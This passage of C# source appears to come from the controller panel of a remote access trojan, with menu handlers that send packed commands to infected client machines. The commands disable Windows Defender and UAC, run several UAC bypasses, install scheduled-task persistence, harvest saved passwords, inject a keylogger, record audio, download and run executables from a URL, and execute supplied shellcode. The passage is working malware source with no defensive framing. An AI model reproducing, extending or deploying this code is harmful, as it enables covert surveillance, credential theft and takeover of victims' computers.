        private void UpdateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
                        msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                        msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
                        msgPack.ForcePathObject("Update").AsString = "true";
                        MsgPack msgPack2 = new MsgPack();
                        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
                        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                        foreach (Clients clients in this.GetSelectedClients())
                        {
                            clients.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "uninstall";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                foreach (Clients @object in this.GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void RebootToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
                msgPack.ForcePathObject("Option").AsString = "restart";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                foreach (Clients @object in this.GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void ShutDownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
                msgPack.ForcePathObject("Option").AsString = "shutdown";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                foreach (Clients @object in this.GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void LogoutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
                msgPack.ForcePathObject("Option").AsString = "logoff";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                foreach (Clients @object in this.GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.notifyIcon1.Dispose();
            Environment.Exit(0);
        }

        private void FileSearchToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (FormFileSearcher formFileSearcher = new FormFileSearcher())
            {
                if (formFileSearcher.ShowDialog() == DialogResult.OK && this.listView1.SelectedItems.Count > 0)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "fileSearcher";
                    msgPack.ForcePathObject("SizeLimit").AsInteger = (long)formFileSearcher.numericUpDown1.Value * 1000L * 1000L;
                    msgPack.ForcePathObject("Extensions").AsString = formFileSearcher.numericUpDown1.Text;
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileSearcher.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    foreach (Clients clients in this.GetSelectedClients())
                    {
                        clients.LV.ForeColor = Color.Red;
                        ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
                    }
                }
            }
        }

        private void InformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.listView1.SelectedItems.Count > 0)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "information";
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Information.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    foreach (Clients @object in this.GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void DisableWDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count > 0)
            {
                DialogResult dialogResult = MessageBox.Show(this, "Only for Admin.", "Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk);
                if (dialogResult == DialogResult.Yes)
                {
                    try
                    {
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
                        MsgPack msgPack2 = new MsgPack();
                        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
                        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                        foreach (Clients clients in this.GetSelectedClients())
                        {
                            if (clients.LV.SubItems[this.lv_admin.Index].Text == "Admin")
                            {
                                ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                }
            }
        }

        private void RecordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (Clients clients in this.GetSelectedClients())
                {
                    if ((FormAudio)Application.OpenForms["Audio Recorder:" + clients.ID] == null)
                    {
                        FormAudio formAudio = new FormAudio
                        {
                            Name = "Audio Recorder:" + clients.ID,
                            Text = "Audio Recorder:" + clients.ID,
                            F = this,
                            ParentClient = clients,
                            Client = clients
                        };
                        formAudio.Show();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void RunasToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "uac";
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    foreach (Clients clients in this.GetSelectedClients())
                    {
                        if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
                        {
                            ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private void SilentCleanupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass";
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    foreach (Clients clients in this.GetSelectedClients())
                    {
                        if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
                        {
                            ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private void SchtaskInstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "schtaskinstall";
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    foreach (Clients @object in this.GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private void PasswordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
                foreach (Clients @object in this.GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack.Encode2Bytes());
                }
                new HandleLogs().Addmsg("Recovering...", Color.Black);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void FodhelperToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass3";
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    foreach (Clients clients in this.GetSelectedClients())
                    {
                        if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
                        {
                            ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private void DisableUACToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count > 0)
            {
                DialogResult dialogResult = MessageBox.Show(this, "Only for Admin.", "Disbale UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk);
                if (dialogResult == DialogResult.Yes)
                {
                    try
                    {
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
                        MsgPack msgPack2 = new MsgPack();
                        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
                        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                        foreach (Clients clients in this.GetSelectedClients())
                        {
                            if (clients.LV.SubItems[this.lv_admin.Index].Text == "Admin")
                            {
                                ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                }
            }
        }

        private void CompMgmtLauncherToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass2";
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    foreach (Clients clients in this.GetSelectedClients())
                    {
                        if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
                        {
                            ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private void DocumentToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start("#");
        }

        private void SettingToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void autoKeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
                msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Keylogger.exe")));
                msgPack.ForcePathObject("Inject").AsString = "";
                ListViewItem listViewItem = new ListViewItem();
                listViewItem.Text = "Auto Keylogger:";
                listViewItem.SubItems.Add("0");
                listViewItem.ToolTipText = Guid.NewGuid().ToString();
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                if (this.listView44.Items.Count > 0)
                {
                    foreach (object obj in this.listView44.Items)
                    {
                        ListViewItem listViewItem2 = (ListViewItem)obj;
                        if (listViewItem2.Text == listViewItem.Text)
                        {
                            return;
                        }
                    }
                }
                Program.form1.listView44.Items.Add(listViewItem);
                Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void SchtaskUninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "schtaskuninstall";
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    foreach (Clients @object in this.GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private void fakeBinderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "fakeBinder";
                    msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                    msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    ListViewItem listViewItem = new ListViewItem();
                    listViewItem.Text = "FakeBinder: " + Path.GetFileName(openFileDialog.FileName);
                    listViewItem.SubItems.Add("0");
                    listViewItem.ToolTipText = Guid.NewGuid().ToString();
                    if (this.listView44.Items.Count > 0)
                    {
                        foreach (object obj in this.listView44.Items)
                        {
                            ListViewItem listViewItem2 = (ListViewItem)obj;
                            if (listViewItem2.Text == listViewItem.Text)
                            {
                                return;
                            }
                        }
                    }
                    Program.form1.listView44.Items.Add(listViewItem);
                    Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                    Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void netstatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Netstat.dll");
                foreach (Clients clients in this.GetSelectedClients())
                {
                    if ((FormNetstat)Application.OpenForms["Netstat:" + clients.ID] == null)
                    {
                        FormNetstat formNetstat = new FormNetstat
                        {
                            Name = "Netstat:" + clients.ID,
                            Text = "Netstat:" + clients.ID,
                            F = this,
                            ParentClient = clients
                        };
                        formNetstat.Show();
                        ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void fromUrlToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url", "", -1, -1);
            if (string.IsNullOrEmpty(text))
            {
                return;
            }
            if (this.listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
                    msgPack.ForcePathObject("url").AsString = text;
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    foreach (Clients @object in this.GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private void sendFileFromUrlToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url", "", -1, -1);
                if (!string.IsNullOrEmpty(text))
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
                    msgPack.ForcePathObject("url").AsString = text;
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    ListViewItem listViewItem = new ListViewItem();
                    listViewItem.Text = "SendFileFromUrl: " + Path.GetFileName(text);
                    listViewItem.SubItems.Add("0");
                    listViewItem.ToolTipText = Guid.NewGuid().ToString();
                    if (this.listView44.Items.Count > 0)
                    {
                        foreach (object obj in this.listView44.Items)
                        {
                            ListViewItem listViewItem2 = (ListViewItem)obj;
                            if (listViewItem2.Text == listViewItem.Text)
                            {
                                return;
                            }
                        }
                    }
                    Program.form1.listView44.Items.Add(listViewItem);
                    Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                    Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void installSchtaskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "autoschtaskinstall";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                ListViewItem listViewItem = new ListViewItem();
                listViewItem.Text = "InstallSchtask:";
                listViewItem.SubItems.Add("0");
                listViewItem.ToolTipText = Guid.NewGuid().ToString();
                if (this.listView44.Items.Count > 0)
                {
                    foreach (object obj in this.listView44.Items)
                    {
                        ListViewItem listViewItem2 = (ListViewItem)obj;
                        if (listViewItem2.Text == listViewItem.Text)
                        {
                            return;
                        }
                    }
                }
                Program.form1.listView44.Items.Add(listViewItem);
                Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void disableUACToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                ListViewItem listViewItem = new ListViewItem();
                listViewItem.Text = "DisableUAC:";
                listViewItem.SubItems.Add("0");
                listViewItem.ToolTipText = Guid.NewGuid().ToString();
                if (this.listView44.Items.Count > 0)
                {
                    foreach (object obj in this.listView44.Items)
                    {
                        ListViewItem listViewItem2 = (ListViewItem)obj;
                        if (listViewItem2.Text == listViewItem.Text)
                        {
                            return;
                        }
                    }
                }
                Program.form1.listView44.Items.Add(listViewItem);
                Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, true));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void disableWDToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                ListViewItem listViewItem = new ListViewItem();
                listViewItem.Text = "DisableDefedner:";
                listViewItem.SubItems.Add("0");
                listViewItem.ToolTipText = Guid.NewGuid().ToString();
                if (this.listView44.Items.Count > 0)
                {
                    foreach (object obj in this.listView44.Items)
                    {
                        ListViewItem listViewItem2 = (ListViewItem)obj;
                        if (listViewItem2.Text == listViewItem.Text)
                        {
                            return;
                        }
                    }
                }
                Program.form1.listView44.Items.Add(listViewItem);
                Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, true));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void ConnectTimeout_Tick(object sender, EventArgs e)
        {
            Clients[] allClients = this.GetAllClients();
            if (allClients.Length != 0)
            {
                foreach (Clients clients in allClients)
                {
                    if (Methods.DiffSeconds(clients.LastPing, DateTime.Now) > 20.0)
                    {
                        clients.Disconnected();
                    }
                }
            }
        }

        private void remoteRegeditToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Regedit.dll");
                foreach (Clients clients in this.GetSelectedClients())
                {
                    if ((FormRegistryEditor)Application.OpenForms["remoteRegedit:" + clients.ID] == null)
                    {
                        FormRegistryEditor formRegistryEditor = new FormRegistryEditor
                        {
                            Name = "remoteRegedit:" + clients.ID,
                            Text = "remoteRegedit:" + clients.ID,
                            ParentClient = clients,
                            F = this
                        };
                        formRegistryEditor.Show();
                        ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void normalInstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "normalinstall";
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    foreach (Clients @object in this.GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private void normalUninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "normaluninstall";
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    foreach (Clients @object in this.GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private void justForFunToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Fun.dll");
                foreach (Clients clients in this.GetSelectedClients())
                {
                    if ((FormFun)Application.OpenForms["fun:" + clients.ID] == null)
                    {
                        FormFun formFun = new FormFun
                        {
                            Name = "fun:" + clients.ID,
                            Text = "fun:" + clients.ID,
                            F = this,
                            ParentClient = clients
                        };
                        formFun.Show();
                        ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void runShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Multiselect = false;
                    openFileDialog.Filter = "(*.bin)|*.bin";
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").AsString = "Shellcode";
                        msgPack.ForcePathObject("Bin").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
                        MsgPack msgPack2 = new MsgPack();
                        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
                        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                        foreach (Clients @object in this.GetSelectedClients())
                        {
                            ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void splitContainer1_Panel2_Paint(object sender, PaintEventArgs e)
        {
        }

        private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {
        }

